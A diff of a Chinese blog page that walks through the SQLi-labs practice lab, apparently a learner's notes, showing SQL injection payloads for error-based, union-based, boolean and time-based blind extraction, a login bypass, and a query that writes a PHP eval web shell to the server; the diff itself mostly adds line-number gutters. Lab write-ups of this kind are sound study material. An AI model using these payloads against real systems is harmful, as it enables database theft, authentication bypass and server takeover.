@@ -488,7 +488,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1k
+                    1.1k
                 </div>
                 
 
@@ -504,9 +504,6 @@
         </div>
         <hr class="clearfix">
 
-        
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.css">
         
 
         
@@ -527,17 +524,17 @@ alt="image-20220820140658390" />
 <ul>
 <li>单引号</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e)),1)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e)),1)--+</span></span><br></pre></td></tr></table></figure>
 <p><a
 target="_blank" rel="noopener" href="https://blog.csdn.net/xiayun1995/article/details/86500605">注释问题</a></p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208201422459.png"
 alt="image-20220820142218341" />
 <figcaption aria-hidden="true">image-20220820142218341</figcaption>
 </figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 2,database(),3 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 2,database(),3 --+</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208201434057.png"
@@ -548,7 +545,7 @@ alt="image-20220820143444929" />
 <ul>
 <li><code>(',')</code>闭合方式</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208201520182.png"
@@ -559,7 +556,7 @@ alt="image-20220820152044050" />
 <li><p>先试探出闭合类型</p></li>
 <li><p>报错：<code>Duplicate entry 'USER0' for key 'group_key'</code></p></li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> concat(database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> concat(database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(database(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <ul>
 <li><a
@@ -584,7 +581,7 @@ target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/artic
 </ul>
 </blockquote>
 <p><strong>爆数据库</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata--+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// &quot;union&quot;: 这是SQL语言中的一个关键字，表示将多个查询结果合并为一个结果集。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;select&quot;: 这是SQL语言中的一个关键字，表示从数据库中选择数据。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;1&quot;: 这是一个常量值，代表一个整数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;group_concat&quot;: 这是MySQL数据库中的一个内置函数，用于将多个字符串连接起来。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;schema_name&quot;: 这是&quot;information_schema.schemata&quot;表中的一列，代表数据库名称。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;information_schema.schemata&quot;: 这是MySQL数据库中的一个系统数据库表，包含数据库信息。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;3&quot;: 这是一个常量值，代表一个整数</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata--+ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// &quot;union&quot;: 这是SQL语言中的一个关键字，表示将多个查询结果合并为一个结果集。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;select&quot;: 这是SQL语言中的一个关键字，表示从数据库中选择数据。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;1&quot;: 这是一个常量值，代表一个整数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;group_concat&quot;: 这是MySQL数据库中的一个内置函数，用于将多个字符串连接起来。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;schema_name&quot;: 这是&quot;information_schema.schemata&quot;表中的一列，代表数据库名称。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;information_schema.schemata&quot;: 这是MySQL数据库中的一个系统数据库表，包含数据库信息。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;3&quot;: 这是一个常量值，代表一个整数</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208202256203.png"
@@ -592,7 +589,7 @@ alt="image-20220820225616066" />
 <figcaption aria-hidden="true">image-20220820225616066</figcaption>
 </figure>
 <p><strong>爆表</strong></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">id=<span class="literal">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="literal">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208202313114.png"
@@ -600,7 +597,7 @@ alt="image-20220820231325984" />
 <figcaption aria-hidden="true">image-20220820231325984</figcaption>
 </figure>
 <p><strong>爆列</strong></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">id=<span class="literal">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="literal">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <ul>
 <li>问题： 不同数据库有相同的表名</li>
@@ -619,27 +616,27 @@ alt="image-20220820232119645" />
 <ul>
 <li>数据库版本</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left(version(),1) =1 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left(version(),1) =1 --+</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>数据库名长度</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211510704.png"
 alt="image-20220821151058589" />
 <figcaption aria-hidden="true">image-20220821151058589</figcaption>
 </figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 猜测数据库第一位</span><br><span class="line"># 可二分法</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 猜第一个表</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 猜测数据库第一位</span><br><span class="line"># 可二分法</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">&gt;</span><span class="string">&#x27;a&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 猜第一个表</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database()limit 0,1),1,1))=101 --+</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211517834.png"
 alt="image-20220821151753707" />
 <figcaption aria-hidden="true">image-20220821151753707</figcaption>
 </figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 匹配列</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and column_name regexp &#x27;</span><span class="operator">^</span>usern[a<span class="operator">-</span>z]<span class="string">&#x27; limit 0,1)-- #</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 第一行数据中用户名这列的首字母</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68 -- #</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 匹配列</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=(select 1 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and column_name regexp &#x27;</span><span class="operator">^</span>usern[a<span class="operator">-</span>z]<span class="string">&#x27; limit 0,1)-- #</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 第一行数据中用户名这列的首字母</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68 -- #</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>报错注入</li>
 <li>延时注入</li>
@@ -649,7 +646,7 @@ alt="image-20220821151753707" />
 <ul>
 <li>导入文件</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlid<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,@@datadir,@@basedir  --+ </span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlid<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,@@datadir,@@basedir  --+ </span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211645371.png"
@@ -668,7 +665,7 @@ alt="image-20220821165326381" />
 <ul>
 <li>读权限</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and (select count(*) from mysql.user)&gt;0 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and (select count(*) from mysql.user)&gt;0 --+</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211700957.png"
@@ -678,7 +675,7 @@ alt="image-20220821170000808" />
 <ul>
 <li>注入木马</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#x27;</span>x<span class="string">&#x27;]);?&gt;&quot; into outfile &quot;/opt/lampp/htdocs/sqli-labs-master/xcb.php&quot; --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#x27;</span>x<span class="string">&#x27;]);?&gt;&quot; into outfile &quot;/opt/lampp/htdocs/sqli-labs-master/xcb.php&quot; --+</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208211716874.png"
@@ -692,22 +689,22 @@ alt="image-20220821171725797" />
 <figcaption aria-hidden="true">image-20220821171725797</figcaption>
 </figure>
 <h3 id="less-9"><strong>Less-9</strong></h3>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and  if(length(database())=8,sleep(5),1) --+ </span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;</span>users<span class="string">&#x27;,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 猜列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and If(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))=101,1,sleep(5))--+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and  if(length(database())=8,sleep(5),1) --+ </span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;</span>users<span class="string">&#x27;,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 猜列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and If(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),1,1))=101,1,sleep(5))--+</span></span><br></pre></td></tr></table></figure>
 <h3 id="less-11"><strong>Less-11</strong></h3>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 --+ &amp;passwd=1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 --+ &amp;passwd=1</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208212151463.png"
 alt="image-20220821215101225" />
 <figcaption aria-hidden="true">image-20220821215101225</figcaption>
 </figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#或者</span><br><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#或者</span><br><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or 1=1 --+</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>字段</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2  --+ &amp;passwd=1 </span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2  --+ &amp;passwd=1 </span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208212211349.png"
@@ -717,7 +714,7 @@ alt="image-20220821221108192" />
 <ul>
 <li>爆出所有数据库</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(schema_name) from information_schema.schemta --+ &amp;passwd=1 </span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(schema_name) from information_schema.schemta --+ &amp;passwd=1 </span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208212221076.png"
@@ -727,11 +724,11 @@ alt="image-20220821222150931" />
 <ul>
 <li>爆出库下所有表</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+ &amp;passwd=1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+ &amp;passwd=1</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>爆出表下所有列</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+ &amp;passwd=1 </span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+ &amp;passwd=1 </span><br></pre></td></tr></table></figure>
 <h3 id="插曲">插曲</h3>
 <ul>
 <li>打算在burp内嵌的浏览器chromium中安装hackbar，但是这个chromium一直无法访问google</li>
@@ -774,7 +771,7 @@ src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208232247800.png"
 alt="image-20220823224729667" />
 <figcaption aria-hidden="true">image-20220823224729667</figcaption>
 </figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(0x7e,(select database()))) --+ &amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(0x7e,(select database()))) --+ &amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220824125340958.png"
@@ -782,7 +779,7 @@ alt="image-20220824125340958" />
 <figcaption aria-hidden="true">image-20220824125340958</figcaption>
 </figure>
 <h3 id="less-12">less-12</h3>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span>&quot;) or 1=1 --+&amp;passwd=1</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">1</span>&quot;) or 1=1 --+&amp;passwd=1</span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220824174845222.png"
@@ -1441,7 +1438,7 @@ alt="image-20220825165136076" />
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">235.5k</span>&nbsp;字
+                class="white-color">236k</span>&nbsp;字
             
             
             
